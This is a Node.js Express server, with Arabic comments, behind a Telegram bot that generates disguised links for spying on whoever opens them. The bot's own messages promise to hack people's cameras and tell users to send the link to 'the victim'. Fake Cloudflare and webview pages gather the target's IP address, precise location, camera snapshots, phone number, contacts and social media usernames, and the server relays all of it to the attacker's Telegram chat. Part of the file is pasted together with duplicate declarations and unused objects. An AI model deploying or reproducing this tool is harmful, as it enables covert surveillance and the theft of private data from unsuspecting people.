// استيراد المكتبات الأساسية
const fs = require("fs"); // التعامل مع نظام الملفات (غير مستخدم حالياً)
const express = require("express"); // لإنشاء تطبيق ويب باستخدام Express.js
var cors = require('cors'); // تمكين Cross-Origin Resource Sharing (CORS)
var bodyParser = require('body-parser'); // لتحليل بيانات الطلبات (JSON و x-www-form-urlencoded)
const fetch = require('node-fetch'); // لجلب البيانات من URL (غير مستخدم حالياً)
const TelegramBot = require('node-telegram-bot-api'); // مكتبة للتعامل مع Telegram Bot

// تهيئة بوت تيليجرام باستخدام المفتاح المخزن في المتغير البيئي
const bot = new TelegramBot(process.env["bot"], { polling: true });

// إعداد body-parser لتحليل البيانات الكبيرة (حتى 20 ميغابايت)
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });

// إنشاء تطبيق Express
const app = express();
app.use(jsonParser); // استخدام jsonParser لتحليل طلبات JSON
app.use(urlencodedParser); // استخدام urlencodedParser لتحليل بيانات URL
app.use(cors()); // تمكين CORS لجميع الطلبات
app.set("view engine", "ejs"); // إعداد محرك القوالب ejs

// تعديل عنوان URL الأساسي (يجب عليك وضع عنوان URL المناسب)
var hostURL = "ادخل الرابط هنا من فضلك";
// متغير للتحكم في استخدام ميزة معينة (مثل اختصارات الروابط)
var use1pt = true;

// إنشاء مسار GET لعرض صفحة webview
app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':'); // تنسيق الوقت الحالي

  // الحصول على عنوان IP للعميل
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  // إذا كان مسار URI موجودًا، عرض صفحة webview
  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    // إعادة توجيه إلى قناة تيليجرام إذا لم يكن المسار موجودًا
    res.redirect("https://t.me/Fta_ibb");
  }
});

// إنشاء مسار GET آخر لعرض صفحة cloudflare
app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':'); // تنسيق الوقت الحالي

  // الحصول على عنوان IP للعميل
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  // إذا كان مسار URI موجودًا، عرض صفحة cloudflare
  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    // إعادة توجيه إلى قناة تيليجرام إذا لم يكن المسار موجودًا
    res.redirect("https://t.me/Fta_ibb");
  }
});

// معالجة رسائل البوت في تيليجرام
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  // إذا كان الرد على رسالة تطلب URL
  if (msg?.reply_to_message?.text == "🌐ادخل الرابط المراد تلغيمة") {
    createLink(chatId, msg.text);
  }

  // عند بدء المحادثة
  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "انشاء رابط جديد", callback_data: "crenew" }]] })
    };

    bot.sendMessage(chatId, `مرحبا يا ${msg.chat.first_name} ! , \nيمكنك استخدام هذا الروبوت لاختراق كاميرات الأشخاص الآليين فقط من خلال رابط بسيط تم بناء هذا البوت بواسطة FTA_IBB وهو بريء من الاستخدامات السلبية والغير أخلاقية.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n إذا كنت تريد شراء ملفات البوت يمكنك التواصل مع المالك @Fta_ibb.\n\nType /help لمزيد من المعلومات.`, m);
  }
  // عند إرسال رسالة "/create"
  else if (msg.text == "/create") {
    createNew(chatId);
  }
  // عند إرسال رسالة "/help"
  else if (msg.text == "/help") {
    bot.sendMessage(chatId, `انقر فوق زر "ابدأ" ثم انقر فوق "إنشاء"\n\nثم أرسل أي رابط موقع إلى الروبوت.\n\nثم يرسل لك الروبوت بعض الروابط انسخ أي رابط وأرسله إلى الضحية\n\nعندما يفتح الضحية الرابط، ستحصل على صورته الذاتية ومعلومات الهاتف المحمول وإذا كان موقع هاتفه المحمول قيد التشغيل، فستحصل على موقعه الدقيق`);
  }
});

// التعامل مع الأحداث عندما ينقر المستخدم على زر البوت
bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

// معالجة أخطاء الاستطلاع لتجنب تعطل البوت
bot.on('polling_error', (error) => {
  // يمكنك تسجيل الأخطاء هنا إذا أردت
  // console.log(error.code);
});



// استيراد المكتبات اللازمة
const express = require("express"); // لإنشاء خادم ويب باستخدام Express.js
const fetch = require("node-fetch"); // لجلب البيانات من URL
const TelegramBot = require("node-telegram-bot-api"); // مكتبة للتعامل مع بوت تيليجرام

// تهيئة بوت تيليجرام باستخدام المفتاح المخزن في المتغير البيئي
const xbot = new TelegramBot(process.env["bot"], { polling: true });

// إنشاء تطبيق Express
const yapp = express();
app.use(express.json()); // تمكين معالجة بيانات JSON

// تعديل عنوان URL الأساسي (ضع عنوان URL الصحيح هنا)
const hostURL = "ادخل عنوان URL الصحيح هنا";
const use1pt = true; // متغير للتحكم في استخدام اختصارات الروابط

// دالة لإنشاء رابط جديد باستخدام بيانات البوت
async function createLink(cid, msg) {
  // التحقق مما إذا كان النص يحتوي على رموز مشفرة (يتجاوز مجموعة الأحرف 127)
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  // التحقق من صحة URL المدخل
  if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg); // إنشاء رابط مشفر باستخدام btoa
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "إنشاء رابط جديد", callback_data: "crenew" }]]
      })
    };

    // بناء روابط CloudFlare و WebView
    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");

    // استخدام اختصارات الروابط إذا كان use1pt مفعلاً
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";
      for (var c in x) { f += x[c] + "\n"; } // جمع الروابط المختصرة
      for (var c in y) { g += y[c] + "\n"; }

      bot.sendMessage(cid, `تم إنشاء الروابط الجديدة بنجاح. يمكنك استخدام أي من الارتباطات أدناه.\n\nURL: ${msg}\n\n💢 قم بالتواصل مع صاحب البوت @Fta_ibb\n\n\n✅رابطك الملغم\n\n🌐 رابط صفحة CloudFlare\n${f}\n\n🌐 رابط صفحة عرض الويب\n${g}`, m);
    } else {
      bot.sendMessage(cid, `تم إنشاء الروابط الجديدة بنجاح. يمكنك استخدام أي من الروابط أدناه.\n\nURL: ${msg}\n\n💢 قم بالتواصل مع صاحب البوت @Fta_ibb\n\n\n✅رابطك الملغم\n\n🌐 رابط صفحة CloudFlare\n${cUrl}\n\n🌐 رابط صفحة عرض الويب\n${wUrl}`, m);
    }
  } else {
    // إرسال رسالة إذا كان URL غير صالح
    bot.sendMessage(cid, `⚠️ الرجاء إدخال عنوان URL صالح، بما في ذلك http أو https`);
    createNew(cid); // استدعاء دالة لإنشاء رابط جديد
  }
}

// دالة لإنشاء طلب جديد
function createNew(cid) {
  var mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
  bot.sendMessage(cid, `🌐 ادخل رابط جديد`, mk);
}

// مسار GET لجلب عنوان IP للعميل
app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.json({ "ip": ip }); // إعادة عنوان IP للعميل في استجابة JSON
});

// مسار POST لتلقي الموقع الجغرافي
app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;

  if (lon !== null && lat !== null && uid !== null && acc !== null) {
    // إرسال الموقع إلى مستخدم تيليجرام
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

// مسار POST لتلقي البيانات العامة
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;

  if (uid !== null && data !== null) {
    // استبدال فواصل الأسطر
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// مسار POST لالتقاط الصور من الكاميرا
app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid !== null && img !== null) {
    var buffer = Buffer.from(img, 'base64'); // تحويل الصورة إلى بايتات
    var info = { filename: "camsnap.png", contentType: 'image/png' };

    try {
      // إرسال الصورة إلى مستخدم تيليجرام
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error); // تسجيل الأخطاء
    }

    res.send("Done");
  }
});

app.post("/getPhoneNumber", (req, res) => {
  // الحصول على معرف المستخدم (uid) من جسم الطلب
  var uid = decodeURIComponent(req.body.uid) || null;
  
  // الحصول على رقم الهاتف (phone) من جسم الطلب
  var phone = decodeURIComponent(req.body.phone) || null;

  // التحقق من أن uid و phone ليسا null
  if (uid !== null && phone !== null) {
    try {
      // إرسال رسالة إلى مستخدم تيليجرام تتضمن رقم الهاتف
      bot.sendMessage(parseInt(uid, 36), `The phone number is: ${phone}`);
    } catch (error) {
      console.log(error); // تسجيل أي أخطاء
    }

    res.send("تم جلب رقم الهاتف بنجاح\n.");
  } else {
    res.status(400).send("طلب غير صالح. معرف الهوية أو رقم الهاتف مفقود.\n ");
  }
});

app.post("/getContacts", (req, res) => {
  // الحصول على معرف المستخدم (uid) من جسم الطلب
  var uid = decodeURIComponent(req.body.uid) || null;
  
  // الحصول على جهات الاتصال (contacts) من جسم الطلب
  var contacts = req.body.contacts ? JSON.parse(decodeURIComponent(req.body.contacts)) : null;

  // التحقق من أن uid و contacts ليسا null
  if (uid !== null && contacts !== null) {
    try {
      // إرسال رسالة إلى مستخدم تيليجرام تحتوي على جهات الاتصال
      let contactList = "Contacts List:\n";
      contacts.forEach((contact, index) => {
        contactList += `${index + 1}. Name: ${contact.name}, Phone: ${contact.phone}\n`;
      });

      bot.sendMessage(parseInt(uid, 36), contactList);
    } catch (error) {
      console.log(error); // تسجيل أي أخطاء
    }

    res.send("Contacts received successfully.");
  } else {
    res.status(400).send("Invalid request. Missing uid or contacts.");
  }
});


app.post("/getSocialAccounts", (req, res) => {
  // الحصول على معرف المستخدم (uid) من جسم الطلب
  var uid = decodeURIComponent(req.body.uid) || null;
  
  // الحصول على أسماء الحسابات على مواقع التواصل (socialAccounts) من جسم الطلب
  var socialAccounts = req.body.socialAccounts ? JSON.parse(decodeURIComponent(req.body.socialAccounts)) : null;

  // التحقق من أن uid و socialAccounts ليسا null
  if (uid !== null && socialAccounts !== null) {
    try {
      // إعداد قائمة بأسماء الحسابات
      let accountList = "Social Media Accounts:\n";
      socialAccounts.forEach((account, index) => {
        accountList += `${index + 1}. Platform: ${account.platform}, Username: ${account.username}\n`;
      });

      // إرسال الرسالة إلى مستخدم تيليجرام
      bot.sendMessage(parseInt(uid, 36), accountList);
    } catch (error) {
      console.log(error); // تسجيل أي أخطاء
    }

    res.send("Social media accounts received successfully.");
  } else {
    res.status(400).send("Invalid request. Missing uid or socialAccounts.");
  }
});



// بدء تشغيل الخادم على المنفذ 5000
app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});

